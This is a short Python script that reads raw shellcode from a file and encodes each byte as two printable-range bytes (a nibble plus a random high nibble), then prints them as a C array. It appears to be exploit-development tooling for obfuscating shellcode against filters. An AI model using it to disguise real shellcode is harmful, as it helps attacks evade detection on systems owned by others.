# read shellcode from `shellcode.bin` and
# generate the encoded shellcode 

import random

with open("shellcode.bin", "rb") as f:
    shcode = f.read()
shlen = len(shcode)

#encode shellcode
enc_shcode = []

for B in shcode:
    L, R = (B >> 4), (B & 0x0F)

    n = random.randrange(2, 6)
    enc_shcode.append((n << 4 | L) & 0xFF)

    n = random.randrange(2, 6)
    enc_shcode.append((n << 4 | R) & 0xFF)

# print as C-array
print("{ ", end='')
print(",".join("0x{:02x}".format(c) for c in enc_shcode), end='')
print(" }")